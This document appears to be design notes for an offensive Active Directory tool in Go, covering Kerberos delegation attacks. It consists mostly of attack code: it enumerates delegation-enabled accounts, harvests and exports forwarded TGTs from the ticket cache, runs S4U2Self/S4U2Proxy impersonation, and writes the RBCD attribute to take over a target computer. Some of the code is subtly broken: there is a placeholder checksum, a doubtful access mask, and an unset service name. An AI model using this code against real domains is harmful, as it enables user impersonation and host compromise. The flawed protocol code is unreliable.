# Kerberos Delegation: Attack Techniques & Go Implementation

> Delegation is one of the most powerful attack surfaces in Active Directory. This document covers all delegation types with detailed Go implementation.

## Table of Contents

1. [Delegation Types Overview](#delegation-types-overview)
2. [Unconstrained Delegation](#unconstrained-delegation)
3. [Constrained Delegation](#constrained-delegation)
4. [Resource-Based Constrained Delegation (RBCD)](#resource-based-constrained-delegation)
5. [S4U Protocol Deep Dive](#s4u-protocol-deep-dive)
6. [Go Implementation](#go-implementation)

---

## Delegation Types Overview

| Type | AD Attribute | Attack Vector |
|------|--------------|---------------|
| Unconstrained | `userAccountControl` flag | Capture forwarded TGTs |
| Constrained | `msDS-AllowedToDelegateTo` | S4U2Proxy to target SPNs |
| RBCD | `msDS-AllowedToActOnBehalfOfOtherIdentity` | S4U2Self + S4U2Proxy |

---

## Unconstrained Delegation

### Theory

When a user authenticates to a service with unconstrained delegation, their **entire TGT is forwarded** to that service. The service stores these TGTs and can use them to impersonate users.

```
┌──────────┐                   ┌────────────────────┐
│   User   │ ── TGT + ST ───▶ │  Unconstrained     │
│          │                   │  Delegation Server │
└──────────┘                   └────────────────────┘
                                        │
                                        │ Server stores user's TGT
                                        │ Can now impersonate user!
                                        ▼
                               ┌────────────────────┐
                               │   Target Service   │
                               └────────────────────┘
```

### Finding Unconstrained Delegation

```go
// pkg/adws/delegation.go

// FindUnconstrainedDelegation finds all accounts with unconstrained delegation
func (c *Client) FindUnconstrainedDelegation() ([]UnconstrainedResult, error) {
    // LDAP filter for unconstrained delegation:
    // userAccountControl has TRUSTED_FOR_DELEGATION bit set (0x80000)
    filter := "(&(userAccountControl:1.2.840.113556.1.4.803:=524288))"
    
    // Enum via ADWS (port 9389)
    results, err := c.Search(filter, []string{
        "sAMAccountName",
        "userAccountControl",
        "dNSHostName",
        "servicePrincipalName",
    })
    if err != nil {
        return nil, err
    }
    
    var findings []UnconstrainedResult
    for _, entry := range results {
        findings = append(findings, UnconstrainedResult{
            Name:      entry.GetString("sAMAccountName"),
            DNSName:   entry.GetString("dNSHostName"),
            SPNs:      entry.GetStrings("servicePrincipalName"),
            UAC:       entry.GetInt("userAccountControl"),
        })
    }
    return findings, nil
}
```

### Monitor for TGTs (Printer Bug + Monitor)

```go
// pkg/windows/monitor.go

// MonitorTGTs watches for new TGTs appearing in the ticket cache
func MonitorTGTs(interval time.Duration, callback func(kirbi *ticket.Kirbi)) error {
    seen := make(map[string]bool)
    
    for {
        // Get all tickets from cache
        tickets, err := TriageTickets(true) // All LUIDs
        if err != nil {
            return err
        }
        
        for _, tkt := range tickets {
            // Only care about TGTs
            if !strings.Contains(tkt.SName, "krbtgt") {
                continue
            }
            
            // Create unique key
            key := fmt.Sprintf("%s:%s:%d", tkt.ClientName, tkt.SName, tkt.StartTime.Unix())
            
            if !seen[key] {
                seen[key] = true
                
                // Export and callback
                kirbi, err := ExportTicket(tkt.LUID, tkt.SName)
                if err == nil {
                    callback(kirbi)
                }
            }
        }
        
        time.Sleep(interval)
    }
}
```

---

## Constrained Delegation

### Theory

Services with constrained delegation can request tickets **only to specific SPNs** listed in `msDS-AllowedToDelegateTo`. Uses S4U2Proxy.

```
┌──────────┐     ┌───────────────────┐     ┌─────────────────┐
│ Attacker │ ──▶ │ Constrained Deleg │ ──▶ │  Allowed SPN    │
│          │     │ Service           │     │  (e.g., CIFS/DC)│
└──────────┘     └───────────────────┘     └─────────────────┘
     │                    │
     │ S4U2Self           │ S4U2Proxy
     │ (get ticket        │ (forward to
     │  for any user)     │  allowed SPN)
     ▼                    ▼
```

### Finding Constrained Delegation

```go
// pkg/adws/delegation.go

// FindConstrainedDelegation finds accounts with constrained delegation
func (c *Client) FindConstrainedDelegation() ([]ConstrainedResult, error) {
    // Look for msDS-AllowedToDelegateTo attribute
    filter := "(msDS-AllowedToDelegateTo=*)"
    
    results, err := c.Search(filter, []string{
        "sAMAccountName",
        "msDS-AllowedToDelegateTo",
        "userAccountControl",
    })
    if err != nil {
        return nil, err
    }
    
    var findings []ConstrainedResult
    for _, entry := range results {
        uac := entry.GetInt("userAccountControl")
        protocolTransition := (uac & 0x1000000) != 0 // TRUSTED_TO_AUTH_FOR_DELEGATION
        
        findings = append(findings, ConstrainedResult{
            Name:               entry.GetString("sAMAccountName"),
            AllowedSPNs:        entry.GetStrings("msDS-AllowedToDelegateTo"),
            ProtocolTransition: protocolTransition,
        })
    }
    return findings, nil
}
```

### Constrained Delegation Attack (S4U)

```go
// pkg/delegation/constrained.go

// ConstrainedDelegationAttack performs S4U2Self + S4U2Proxy
func ConstrainedDelegationAttack(opts *ConstrainedOptions) (*ticket.Kirbi, error) {
    // Step 1: S4U2Self - Get a service ticket for the target user
    s4u2selfTicket, err := client.S4U2Self(&client.S4URequest{
        Domain:        opts.Domain,
        TGT:           opts.ServiceTGT,
        ImpersonateUser: opts.TargetUser,
    })
    if err != nil {
        return nil, fmt.Errorf("S4U2Self failed: %w", err)
    }
    
    // Step 2: S4U2Proxy - Forward to allowed SPN
    s4u2proxyTicket, err := client.S4U2Proxy(&client.S4URequest{
        Domain:        opts.Domain,
        TGT:           opts.ServiceTGT,
        AdditionalTicket: s4u2selfTicket, // The S4U2Self ticket
        TargetSPN:     opts.TargetSPN,
    })
    if err != nil {
        return nil, fmt.Errorf("S4U2Proxy failed: %w", err)
    }
    
    return s4u2proxyTicket, nil
}
```

---

## Resource-Based Constrained Delegation

### Theory

RBCD flips the trust model: the **target resource** specifies who can delegate to it, not the delegating account. This is controlled by `msDS-AllowedToActOnBehalfOfOtherIdentity`.

### Attack Scenario

If you can write to `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer:

1. Add a machine account you control
2. Use S4U2Self + S4U2Proxy from that machine to access the target

### Setting RBCD (Requires Write Permission)

```go
// pkg/delegation/rbcd.go

// ConfigureRBCD sets the msDS-AllowedToActOnBehalfOfOtherIdentity attribute
func ConfigureRBCD(opts *RBCDOptions) error {
    // Build security descriptor with the machine account SID
    sd := buildSecurityDescriptor(opts.MachineSID)
    
    // Encode as binary for LDAP
    sdBytes, err := sd.Marshal()
    if err != nil {
        return fmt.Errorf("failed to marshal SD: %w", err)
    }
    
    // Modify via ADWS
    return opts.Client.ModifyAttribute(
        opts.TargetDN,
        "msDS-AllowedToActOnBehalfOfOtherIdentity",
        sdBytes,
    )
}

// buildSecurityDescriptor creates an SD allowing the SID to delegate
func buildSecurityDescriptor(sid string) *SecurityDescriptor {
    // Parse SID
    sidBytes := parseSID(sid)
    
    // Build DACL with one ACE
    ace := &ACE{
        Type:   ACCESS_ALLOWED_ACE_TYPE,
        Flags:  0,
        Access: ADS_RIGHT_ACTRL_DS_LIST | ADS_RIGHT_DS_READ_PROP,
        SID:    sidBytes,
    }
    
    return &SecurityDescriptor{
        Revision: 1,
        Control:  SE_DACL_PRESENT,
        DACL: &ACL{
            Revision: 2,
            ACEs:     []*ACE{ace},
        },
    }
}
```

### RBCD Attack Flow

```go
// pkg/delegation/rbcd.go

// RBCDAttack performs the full RBCD attack
func RBCDAttack(opts *RBCDAttackOptions) (*ticket.Kirbi, error) {
    // Step 1: Configure RBCD on target (if we have write access)
    if opts.Configure {
        err := ConfigureRBCD(&RBCDOptions{
            Client:     opts.Client,
            TargetDN:   opts.TargetDN,
            MachineSID: opts.MachineSID,
        })
        if err != nil {
            return nil, fmt.Errorf("failed to configure RBCD: %w", err)
        }
    }
    
    // Step 2: S4U2Self (get ticket for target user, to ourselves)
    s4u2selfTicket, err := client.S4U2Self(&client.S4URequest{
        Domain:          opts.Domain,
        TGT:             opts.MachineTGT,
        ImpersonateUser: opts.TargetUser,
    })
    if err != nil {
        return nil, fmt.Errorf("S4U2Self failed: %w", err)
    }
    
    // Step 3: S4U2Proxy (forward to target service)
    s4u2proxyTicket, err := client.S4U2Proxy(&client.S4URequest{
        Domain:           opts.Domain,
        TGT:              opts.MachineTGT,
        AdditionalTicket: s4u2selfTicket,
        TargetSPN:        opts.TargetSPN, // e.g., "CIFS/target.domain.local"
    })
    if err != nil {
        return nil, fmt.Errorf("S4U2Proxy failed: %w", err)
    }
    
    return s4u2proxyTicket, nil
}
```

---

## S4U Protocol Deep Dive

### S4U2Self

Request a service ticket for any user **to yourself**. Requires `TRUSTED_TO_AUTH_FOR_DELEGATION` or RBCD.

```go
// pkg/client/s4u.go

// S4U2Self requests a service ticket for another user to the requesting service
func S4U2Self(req *S4URequest) (*ticket.Kirbi, error) {
    // Build TGS-REQ with PA-FOR-USER padata
    tgsReq := &asn1krb5.TGSReq{
        PVNo:    5,
        MsgType: 12, // TGS-REQ
        PaData: []asn1krb5.PAData{
            // PA-TGS-REQ with AP-REQ containing our TGT
            buildPATGSReq(req.TGT),
            // PA-FOR-USER specifying who to impersonate
            buildPAForUser(req.ImpersonateUser, req.Domain),
        },
        ReqBody: asn1krb5.KDCReqBody{
            KDCOptions: asn1.BitString{Bytes: []byte{0x40, 0x81, 0x00, 0x00}},
            Realm:      req.Domain,
            SName: asn1krb5.PrincipalName{
                Type:   2, // NT-SRV-INST
                Names:  []string{req.ServiceName, req.Domain},
            },
            Till:  time.Now().Add(10 * time.Hour),
            Nonce: rand.Uint32(),
            EType: []int32{18, 17, 23}, // AES256, AES128, RC4
        },
    }
    
    // Send to KDC
    response, err := sendToKDC(req.Domain, tgsReq.Marshal())
    if err != nil {
        return nil, err
    }
    
    // Parse TGS-REP
    return parseS4UResponse(response)
}

// buildPAForUser creates the PA-FOR-USER padata
func buildPAForUser(user, realm string) asn1krb5.PAData {
    // PA-FOR-USER contains:
    // - User name
    // - User realm
    // - Checksum (HMAC with session key)
    // - Auth package (always "Kerberos")
    paForUser := asn1krb5.PAForUser{
        UserName: asn1krb5.PrincipalName{
            Type:  1, // NT-PRINCIPAL
            Names: []string{user},
        },
        UserRealm:   realm,
        CKSum:       /* HMAC checksum */,
        AuthPackage: "Kerberos",
    }
    
    return asn1krb5.PAData{
        Type:  129, // PA-FOR-USER
        Value: paForUser.Marshal(),
    }
}
```

### S4U2Proxy

Forward a user's ticket to another service. Requires the service to be in `msDS-AllowedToDelegateTo` (constrained) or RBCD.

```go
// pkg/client/s4u.go

// S4U2Proxy forwards a user's ticket to another service
func S4U2Proxy(req *S4URequest) (*ticket.Kirbi, error) {
    // Build TGS-REQ with additional-tickets
    tgsReq := &asn1krb5.TGSReq{
        PVNo:    5,
        MsgType: 12,
        PaData: []asn1krb5.PAData{
            buildPATGSReq(req.TGT),
        },
        ReqBody: asn1krb5.KDCReqBody{
            // CNAME-IN-ADDL-TKT and CONSTRAINED-DELEGATION flags
            KDCOptions: asn1.BitString{Bytes: []byte{0x40, 0x81, 0x00, 0x20}},
            Realm:      req.Domain,
            SName:      parseSPN(req.TargetSPN),
            Till:       time.Now().Add(10 * time.Hour),
            Nonce:      rand.Uint32(),
            EType:      []int32{18, 17, 23},
            // The S4U2Self ticket goes here!
            AdditionalTickets: []asn1krb5.Ticket{
                req.AdditionalTicket.Ticket(),
            },
        },
    }
    
    response, err := sendToKDC(req.Domain, tgsReq.Marshal())
    if err != nil {
        return nil, err
    }
    
    return parseS4UResponse(response)
}
```

---

## Go Implementation Tips

### 1. MSB Bit Ordering in Flags

```go
// KDC options are MSB-first
// FORWARDABLE = bit 1 (from left), RENEWABLE = bit 8, etc.
func setKDCOption(opts []byte, bit int) {
    byteIndex := bit / 8
    bitIndex := 7 - (bit % 8)
    opts[byteIndex] |= (1 << bitIndex)
}
```

### 2. Handling Time Fields

```go
// Kerberos uses GeneralizedTime: YYYYMMDDHHMMSSZ
func formatKerberosTime(t time.Time) string {
    return t.UTC().Format("20060102150405Z")
}

func parseKerberosTime(s string) (time.Time, error) {
    return time.Parse("20060102150405Z", s)
}
```

### 3. Building SPNs

```go
// SPN format: service/host:port or service/host
func parseSPN(spn string) asn1krb5.PrincipalName {
    parts := strings.Split(spn, "/")
    if len(parts) != 2 {
        return asn1krb5.PrincipalName{}
    }
    return asn1krb5.PrincipalName{
        Type:  2, // NT-SRV-INST
        Names: parts,
    }
}
```

---

## Related Documents

- [KERBEROS_101.md](KERBEROS_101.md) - Kerberos fundamentals
- [ATTACKS.md](ATTACKS.md) - Attack techniques
- [TGTDELEG_IMPLEMENTATION.md](TGTDELEG_IMPLEMENTATION.md) - TGTDeleg Go implementation
